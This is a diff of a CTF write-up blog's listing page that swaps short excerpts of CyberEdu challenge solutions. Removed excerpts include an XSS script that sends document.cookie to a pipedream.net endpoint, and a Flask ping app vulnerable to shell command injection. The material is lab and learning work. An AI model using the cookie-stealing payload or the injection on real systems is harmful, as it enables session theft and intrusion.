@@ -137,157 +137,154 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu puzzled Writeup
+    <h2 class="entry-hint-parent">CyberEdu montgomery Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview How puzzled can you get with php?
-I really didn’t feel like doing php challenges but I did it anyways.
-Identifying the vulnerabilities We get a php source file with what looks like login. If we don’t provide a pass, the source gets leaked.
-if (isset($_GET[&#39;pass&#39;])){ $pass = generateRandomString(95); $user_input = json_decode($_GET[&#39;pass&#39;]); if ($pass != $user_input-&gt;pass) { header(&#39;HTTP/1.0 403 Forbidden&#39;); exit; } They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn’t correct. But the comparison is done with !=, not !==. For example, 5!=&#34;5&#34; would return false, while 5!==&#34;5&#34; would return true.
+    <p>Challenge overview E prima data cand ai un contact cu o proba de pwn? Acest exercitiu s-ar putea sa fie pentru tine.
+PS: Acest serviciu merge cu netcat.
+Identifying the vulnerabilities This is just a basic format string vulnerability. Leaking from $69%p to $100%p, we get the flag but in that fuckass format that I would usually put in a string reverser, 8 ASCII by 8 ASCII. But not this time. I wrote a script.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-18 00:00:00 +0000 UTC'>January 18, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu puzzled Writeup" href="https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-02-04 00:00:00 +0000 UTC'>February 4, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu montgomery Writeup" href="https://irinasusca.github.io/writeup-blog/posts/montgomery-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu js-magic Writeup
+    <h2 class="entry-hint-parent">CyberEdu biscuiti Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Javascript Obfuscation 101.
-Already sounds bad, and I just noticed the Cryptography tag, but let’s give it a go. We’re only given a chall_clean.js file, and no instance.
-Identifying the vulnerabilities I tried running it in an online compiler, but it required the window component, so I locally added an index.html buddy for it and ran them together, and what it did was open a lot of porn tabs.
+    <p>Challenge overview Biscuiții mei au prea multe calorii, așa că trebuie să îi împart în mai multe porții.
+În această probă, aveți o captură PCAP, iar obiectivul este să recuperați un secret.
+I already solved this last year at the OSCJ but the foolish way, looking through pcaps like a fool. But now, we’re solving this with tshark!
+The command I used was tshark -r task.pcap -Y http -T fields -e http.cookie_pair to print out all of the cookie parts, along with their indexes. But then I thought, what the hell, if I’m not doing that manually, I’m not doing anything manually! So I came up with this command:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-15 00:00:00 +0000 UTC'>January 15, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu js-magic Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jsmagic-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-02-03 00:00:00 +0000 UTC'>February 3, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu biscuiti Writeup" href="https://irinasusca.github.io/writeup-blog/posts/biscuiti-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu rundown Writeup
+    <h2 class="entry-hint-parent">CyberEdu private-coms Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview A rundown, informally known as a pickle or the hotbox, is a situation in the game of baseball that occurs when the baserunner is stranded between two bases, also known as no-man’s land, and is in jeopardy of being tagged out.&#34; … if you stopped in the first part of the definition you are one of ours.
-This is EXACTLY like slightly-broken (you could take a look at it, it’s short), except the pin things are actually being used!
+    <p>Challenge overview Există o comunicare scursă în acest fișier pcap. Găsește-o și obține flag-ul.
+Another challenge I’ve come across at OSCN, which I didn’t solve, because binwalk won’t show it found files if it can’t extract them using -e but it will find and extract them using more flags.
+Doing a simple binwalk -Mve --dd=&#34;.*&#34; private-coms.pcap extracts an audio file reading out the flag. I didn’t bother listening to it so I popped it into one of those AI wrapper speech to text apps, and got the text in CAPS so I just lowered it with python.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-15 00:00:00 +0000 UTC'>January 15, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu rundown Writeup" href="https://irinasusca.github.io/writeup-blog/posts/rundown-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-02-03 00:00:00 +0000 UTC'>February 3, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu private-coms Writeup" href="https://irinasusca.github.io/writeup-blog/posts/privatecoms-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu slightly-broken Writeup
+    <h2 class="entry-hint-parent">CyberEdu dumb-discord Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview For this one, only contact admins for socialising with them. Do not contact them for errors at this challenge.
-Identifying the vulnerabilities We bump into some errors, but look at this section of a response:
-This is part of the Flask/Werkzeug’s interactive debugger, and we see it because of the error.
-To execute a command, we need the params __debugger__: &#39;yes&#39;, cmd: &#39;pinauth&#39;, pin: pin, s: SECRET as json. In a GET request, because Workzeug uses GETs not POST.
+    <p>Challenge overview Well here is an example of a funny discord bot.
+_PS: Please note that the IP:PORT received is not needed to solve the challenge and nothing will answer there. _
+Identifying the vulnerabilities The script, decompiled:
+# Decompiled with PyLingual (https://pylingual.io) # Internal filename: server.py # Bytecode version: 3.6rc1 (3379) # Source timestamp: 2020-12-02 02:30:35 UTC (1606876235) from discord.ext import commands import discord import json from discord.utils import get def obfuscate(byt): mask = b&#39;ctf{tryharderdontstring}&#39; lmask = len(mask) return bytes((c ^ mask[i % lmask] for i, c in enumerate(byt))) def test(s): data = obfuscate(s.encode()) return data intents = discord.Intents.default() intents.members = True cfg = open(&#39;config.json&#39;, &#39;r&#39;) tmpconfig = cfg.read() cfg.close() config = json.loads(tmpconfig) token = config[test(&#39;\x17\x1b\r\x1e\x1a&#39;).decode()] client = commands.Bot(command_prefix=&#39;/&#39;) @client.event async def on_ready(): print(&#39;Connected to bot: {}&#39;.format(client.user.name)) print(&#39;Bot ID: {}&#39;.format(client.user.id)) @client.command() async def getflag(ctx): await ctx.send(test(&#39;\x13\x1b\x08\x1c&#39;).decode()) @client.event async def on_message(message): await client.process_commands(message) if test(&#39;B\x04\x0f\x15\x13&#39;).decode() in message.content.lower(): await message.channel.send(test(&#39;\x13\x1b\x08\x1c&#39;).decode()) if test(&#39;L\x13\x03\x0f\x12\x1e\x18\x0f&#39;).decode() in message.content.lower() and message.author.id == 783473293554352141: role = discord.utils.get(message.author.guild.roles, name=test(&#39;\x07\x17\x12\x1dFBKXO\x11\x1d\x07\x17\x16\n\n\x01]\x06\x1d&#39;).decode()) member = discord.utils.get(message.author.guild.members, id=message.author.id) if role in member.roles: await message.channel.send(test(config[test(&#39;\x05\x18\x07\x1c&#39;).decode()])) if test(&#39;L\x1c\x03\x17\x04&#39;).decode() in message.content.lower(): await message.channel.send(test(&#39;7\x06\x1f[\x1c\x13\x0b\x0c\x04\x00E&#39;).decode()) if &#39;/s基ay&#39; in message.content.lower(): await message.channel.send(message.content.replace(&#39;/s基ay&#39;, &#39;&#39;).replace(test(&#39;L\x13\x03\x0f\x12\x1e\x18\x0f&#39;).decode(), &#39;&#39;)) client.run(token) I ran the bot locally to decode those strings, and here is the less obfuscated stuff:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu slightly-broken Writeup" href="https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-02-02 00:00:00 +0000 UTC'>February 2, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu dumb-discord Writeup" href="https://irinasusca.github.io/writeup-blog/posts/dumbdiscord-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu downloader-v1 Writeup
+    <h2 class="entry-hint-parent">CyberEdu formula1 Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
-Identifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?
+    <p>Challenge overview Only a champion can win this race. Enter the secret pit stop and claim your flag!
+Identifying the vulnerabilities We’re confronted with a login page, with two fields, Only for F1 champions. Enter your first name and pit code to start your engine. Entering a random username and random password would give an Invalid username error, but sending max (for Max Verstappen) would give an Invalid pit code.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu downloader-v1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-02-02 00:00:00 +0000 UTC'>February 2, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu formula1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/formula1-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu manual-review Writeup
+    <h2 class="entry-hint-parent">CyberEdu imagine-that Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview For any coffe machine issue please open a ticket at the IT support department.
-Flag format: ctf{sha256}
-Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
-Identifying the vulnerabilities This look familiar?
-Alright, so XSS is confirmed, and we have two types of cookies.
-First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
-I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -
+    <p>This challenge is part of one of the Unbreakable python labs, and I decided to solve the challenge myself instead of just reading about it. And since it’s pwn, should be fun!
+Challenge overview Imagine that we are using socat for this one.
+We get a server to connect to, with socat, and we’re prompted to give a starting point twice. This however refers to the starting point first and then the ending point, and it prints out the bytes between the two offsets, then asks us for a password. We can only enter numbers from 1 to 10.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu manual-review Writeup" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-31 00:00:00 +0000 UTC'>January 31, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu imagine-that Writeup" href="https://irinasusca.github.io/writeup-blog/posts/imaginethat-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu broken-login Writeup
+    <h2 class="entry-hint-parent">CyberEdu digikey Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure…
-Identifying the vulnerabilities This is how our POST requests are sent.
-Then, another GET is made: GET /auth?username=67616761&amp;password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6.
-That’s a sha512 hash. I’m thinking, why don’t we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though.
+    <p>Challenge overview This challenge contains the extracted ELF data from a compiled atTiny85 avr chip The device was automatically being detected as a keyboard and inputs in a loop the ctf flag as string.
+We receive an Atmel AVR 8-bit file, which is the code for a microcontroller, so we can’t run it locally on our kali (since it’s COMPILED). So we need a decompiler, but of course IDA Pro is too expensive and ghidra looks absolutely awful, so we have to look for one online.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu broken-login Writeup" href="https://irinasusca.github.io/writeup-blog/posts/brokenlogin-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-30 00:00:00 +0000 UTC'>January 30, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu digikey Writeup" href="https://irinasusca.github.io/writeup-blog/posts/digikey-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu file-crawler Writeup
+    <h2 class="entry-hint-parent">CyberEdu mountain Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>I was stuck between starting to study heap properly or keep doing web challenges, and I guess here we are.
-Challenge overview Find the vulnerability and get the flag. The flag is located in a temporary folder.
-Identifying the vulnerabilities I inspected the original GET request with burp:
-Since the flag is located in a “temporary folder”, my first guess was /tmp/flag. I tried /local, and we get a TRY HARDER message.
+    <p>Challenge overview Take a look at those mountains!
+We get a zip file I ran binwalk -Me --dd=&#34;.*&#34; filename on (just does it recursively). We get a PNG file which has a barely visible flag in the top left which I noticed waay to late; I opened a web version of gimp, turned off the green and blue, and the flag became just visible enough to be transcribed.
+Here it is: DCTF{157d2d840f229720e7f8082dd4468a8583fb348ebf2cb38456147dc046ff942d}
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-30 00:00:00 +0000 UTC'>January 30, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu mountain Writeup" href="https://irinasusca.github.io/writeup-blog/posts/mountain-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
+    <h2 class="entry-hint-parent">CyberEdu pawn-shop Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Just another ping service to audit.
-We get an app(1).py file to look at.
-from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
+    <p>Challenge overview Se spune ca fericirea nu poate fi cumparata. Acesta este cazul si pentru acest magazin. Trebuie sa gasesti o vulnerabilitate in aceasta aplicatie si sa recuperezi secretul.
+This was one of the challenges from OSC 2025 county phase, I remember it, so let’s quickly solve this.
+Identifying the vulnerabilities Trying to access the flag, we get this response:
+Adding the allowed Origin as a HTTP Header, we get the flag.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-30 00:00:00 +0000 UTC'>January 30, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu pawn-shop Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pawnshop-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu jargon Writeup
+    <h2 class="entry-hint-parent">CyberEdu ast-tree Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
-Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:
+    <p>Challenge overview A careless developer left behind some code that reads sensitive files directly from disk.
+We’re prompted with a “Paste your AST-Grep YAML rule here” and an option to run it. ast-grep is a code tool for structural search and replace, like syntax-aware grep.
+We can also use jQuery like utility methods to traverse syntax tree nodes.
+Identifying the vulnerabilities Upon entering an invalid file, we get this ChatGPT written error:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu jargon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-29 00:00:00 +0000 UTC'>January 29, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu ast-tree Writeup" href="https://irinasusca.github.io/writeup-blog/posts/asttree-writeup/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
